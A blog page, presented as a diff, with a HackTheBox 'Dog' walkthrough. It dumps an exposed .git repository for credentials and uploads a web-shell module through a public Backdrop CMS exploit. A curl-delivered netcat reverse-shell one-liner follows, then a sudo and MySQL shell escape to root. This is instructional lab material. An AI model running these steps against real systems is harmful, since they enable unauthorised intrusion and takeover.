@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackTheBox - Dog Walkthrough | mdn1nj4's Blog</title><meta name="author" content="mdn1nj4"><meta name="copyright" content="mdn1nj4"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="HackTheBox's dog is an easy level linux machine."><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox - Dog Walkthrough",
+  "url": "https://mdn1nj4.github.io/htb/hackthebox-dog-walkthrough/",
+  "image": "https://avatars.githubusercontent.com/u/24633923?v=4",
+  "datePublished": "2025-05-06T18:30:00.000Z",
+  "dateModified": "2025-10-26T07:25:51.127Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "mdn1nj4",
+      "url": "https://mdn1nj4.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/24633923?v=4"><link rel="canonical" href="https://mdn1nj4.github.io/htb/hackthebox-dog-walkthrough/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-X9TKY34D40"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-X9TKY34D40')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-X9TKY34D40', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackTheBox - Dog Walkthrough',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="mdn1nj4's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">mdn1nj4's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HackTheBox - Dog Walkthrough</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">HackTheBox - Dog Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-06T18:30:00.000Z" title="Created 2025-05-07 00:00:00">2025-05-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-26T07:25:51.127Z" title="Updated 2025-10-26 12:55:51">2025-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>6mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p><strong>OS</strong>: Linux<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 20<br><strong>Release</strong>: 09 Mar 2025<br><strong>IP</strong>: 10.10.11.58</p>
+</blockquote>
+<h2 id="Enumeration-amp-Initial-Access"><a href="#Enumeration-amp-Initial-Access" class="headerlink" title="Enumeration &amp; Initial Access"></a>Enumeration &amp; Initial Access</h2><h3 id="Nmap-Scan-Result"><a href="#Nmap-Scan-Result" class="headerlink" title="Nmap Scan Result"></a>Nmap Scan Result</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=</span><br><span class="line">|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=</span><br><span class="line">|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Home | Dog</span><br><span class="line">| http-git:</span><br><span class="line">|   10.10.11.58:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...</span><br><span class="line">|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510</span><br><span class="line">| http-robots.txt: 22 disallowed entries</span><br><span class="line">| /core/ /profiles/ /README.md /web.config /admin</span><br><span class="line">| /comment/reply /filter/tips /node/add /search /user/register</span><br><span class="line">| /user/password /user/login /user/logout /?q=admin /?q=comment/reply</span><br><span class="line">| /?q=filter/tips /?q=node/add /?q=search /?q=user/password</span><br><span class="line">|_/?q=user/register /?q=user/login /?q=user/logout</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-generator: Backdrop CMS 1 (https://backdropcms.org)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p><strong>Open Ports</strong>: <code>22</code>, <code>80</code></p>
+<ul>
+<li><p><strong>22</strong> – SSH</p>
+</li>
+<li><p><strong>80</strong> – Backdrop CMS 1</p>
+</li>
+</ul>
+<p>After some reconnaissance, I identified that the web server is running <strong>Backdrop CMS 1</strong>, which is known to have a <strong>Remote Code Execution (RCE)</strong> vulnerability. A relevant exploit is available here:<br>🔗 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52021">Exploit-DB 52021</a></p>
+<p>However, the exploit <strong>requires valid credentials</strong></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/yWkvmLbD"><img src="https://i.postimg.cc/v8vkdj7t/htb-dog1.png" alt="htb-dog1.png"></a></p>
+<h3 id="git-Folder-Discovery"><a href="#git-Folder-Discovery" class="headerlink" title=".git Folder Discovery"></a>.git Folder Discovery</h3><p>Further enumeration revealed that the <code>.git</code> folder was accessible—something typically not meant to be public. This was discovered via the Nmap scan.</p>
+<p>To dump the repository, I used <a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper">git-dumper</a>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://10.10.11.58/.git/ ./dumped-repo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">╰─❯ git-dumper http://10.10.11.58/.git .</span><br><span class="line">Warning: Destination &#x27;.&#x27; is not empty</span><br><span class="line">[-] Testing http://10.10.11.58/.git/HEAD [200]</span><br><span class="line">[-] Testing http://10.10.11.58/.git/ [200]</span><br><span class="line">[-] Fetching .git recursively</span><br><span class="line">[-] Fetching http://10.10.11.58/.gitignore [404]</span><br><span class="line">[-] http://10.10.11.58/.gitignore responded with status code 404</span><br><span class="line">[-] Fetching http://10.10.11.58/.git/ [200]</span><br><span class="line">[-] Fetching http://10.10.11.58/.git/objects/ff/f99b60388f8dabaa3ccb41a86ac100b29a75fa [200]</span><br><span class="line">[-] Running git checkout .</span><br><span class="line">Updated 2873 paths from the index</span><br><span class="line"></span><br><span class="line">╰─❯ ls</span><br><span class="line">core/  files/  index.php*  layouts/  LICENSE.txt*  README.md*  robots.txt*    settings.php*  sites/  themes/</span><br></pre></td></tr></table></figure>
+
+<p>Inside the dumped repository, I found sensitive credentials.</p>
+<h3 id="Credentials-Found"><a href="#Credentials-Found" class="headerlink" title="Credentials Found"></a>Credentials Found</h3><ul>
+<li><p><strong>Password</strong> (in <code>settings.php</code>):<br>  <code>BackDropJ2024DS2024</code></p>
+</li>
+<li><p><strong>Usernames</strong> (in <code>update.settings.json</code>):</p>
+<ul>
+<li><p><code>tiffany@dog.htb</code></p>
+</li>
+<li><p><code>dog@dog.htb</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>After trying the credentials, I confirmed that the valid login was:<br>➡️ <strong>Username</strong>: <code>tiffany</code><br>➡️ <strong>Password</strong>: <code>BackDropJ2024DS2024</code></p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a> Download the exploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─❯ python3 52021.py http://10.10.11.58/</span><br><span class="line">Backdrop CMS 1.27.1 - Remote Command Execution Exploit</span><br><span class="line">Evil module generating...</span><br><span class="line">Evil module generated! shell.zip</span><br><span class="line">Go to http://10.10.11.58/?q=admin/modules/install and upload the shell.zip for Manual Installation.</span><br><span class="line">Your shell address: http://10.10.11.58/modules/shell/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Compress the created files into the tar.gz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╰─❯ tar -czvf shell1.tar.gz shell/</span><br><span class="line">shell/</span><br><span class="line">shell/shell.info</span><br><span class="line">shell/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Using the credentials, I authenticated and manually uploaded the malicious module archive (<code>shell1.tar.gz</code>) via: <a target="_blank" rel="noopener" href="http://10.10.11.58/?q=admin/installer/manual">http://10.10.11.58/?q=admin/installer/manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/bSDgqvtx"><img src="https://i.postimg.cc/kGwpF6Mp/htb-dog2.png" alt="htb-dog2.png"></a></p>
+<p>After successful upload, I accessed the web shell: <code>http://10.10.11.58/modules/shell/shell.php?cmd=id</code></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/qtwjLSr3"><img src="https://i.postimg.cc/d1PpqcS4/htb-dog3.png" alt="htb-dog3.png"></a></p>
+<p>Then started a <strong>Netcat listener</strong> to catch the reverse shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://10.10.11.58/modules/shell/shell.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xxx 1234 &gt;/tmp/f&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╰─❯ nc -lvvnkp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.xxx.xxx] from (UNKNOWN) [10.10.11.58] 37612</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory </span><br><span class="line"></span><br><span class="line">www-data@dog:/var/www/html/modules/shell$ ls /home</span><br><span class="line">ls /home</span><br><span class="line">jobert  johncusack</span><br></pre></td></tr></table></figure>
+
+<p>With the shell, I found a local user: <code>johncusack</code>, and tested the credentials we found earlier.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">╰─❯ ssh johncusack@10.10.11.58</span><br><span class="line">The authenticity of host &#x27;10.10.11.58 (10.10.11.58)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.58&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">johncusack@10.10.11.58&#x27;s password:</span><br><span class="line"></span><br><span class="line">johncusack@dog:~$ cat user.txt</span><br><span class="line">d158489555d5e3de8cc87xxxxxxxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>✅ Logged in successfully and obtained the <strong>user flag</strong>.</p>
+<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>Next, I noticed that johncusack could run the bee binary with sudo:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">johncusack@dog:/var/www/html$ sudo -l</span><br><span class="line">[sudo] password for johncusack:</span><br><span class="line">Matching Defaults entries for johncusack on dog:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User johncusack may run the following commands on dog:</span><br><span class="line">    (ALL : ALL) /usr/local/bin/bee</span><br></pre></td></tr></table></figure>
+
+<p>Reference: <a target="_blank" rel="noopener" href="https://github.com/backdrop-contrib/bee">Backdrop Bee Tool</a></p>
+<p>The bee tool provides multiple ways to escalate privileges. I used the MySQL configuration method to gain a root shell.</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/JDhKdx7d"><img src="https://i.postimg.cc/cHRjCkpZ/htb-dog4.png" alt="htb-dog4.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee sql</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 14503</span><br><span class="line">Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2025, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; \! /bin/sh</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"># cat /root/root.txt</span><br><span class="line">83eee20657fc895f4f0exxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>And finally…<br>🎉 <strong>Got the root flag!</strong></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/git/">git</a><a class="post-meta__tags" href="/tags/cve/">cve</a><a class="post-meta__tags" href="/tags/rce/">rce</a><a class="post-meta__tags" href="/tags/sudo/">sudo</a><a class="post-meta__tags" href="/tags/backdrop/">backdrop</a><a class="post-meta__tags" href="/tags/htb/">htb</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/24633923?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/htb/hackthebox-jerry-walkthrough/" title="HackTheBox - Jerry Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">HackTheBox - Jerry Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's jerry is an easy level windows machine.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-nocturnal-walkthrough/" title="HackTheBox - Nocturnal Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HackTheBox - Nocturnal Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's nocturnal is an easy level linux machine.</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/htb/hackthebox-nocturnal-walkthrough/" title="HackTheBox - Nocturnal Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-08</div><div class="info-item-2">HackTheBox - Nocturnal Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's nocturnal is an easy level linux machine.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-titanic-walkthrough/" title="HackTheBox - Titanic Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-15</div><div class="info-item-2">HackTheBox - Titanic Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's titanic is an easy level linux machine.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-trick-writeup/" title="HackTheBox - Trick Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-05</div><div class="info-item-2">HackTheBox - Trick Walkthrough</div></div><div class="info-2"><div class="info-item-1">Trick was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-underpass-walkthrough/" title="HackTheBox - UnderPass Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-10</div><div class="info-item-2">HackTheBox - UnderPass Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's underpass is an easy level linux machine.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-late-writeup/" title="HackTheBox - Late Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - Late Walkthrough</div></div><div class="info-2"><div class="info-item-1">Late was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-routerspace-writeup/" title="HackTheBox - RouterSpace Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - RouterSpace Writeup</div></div><div class="info-2"><div class="info-item-1">RouterSpace was an easy box from hackthebox.</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div 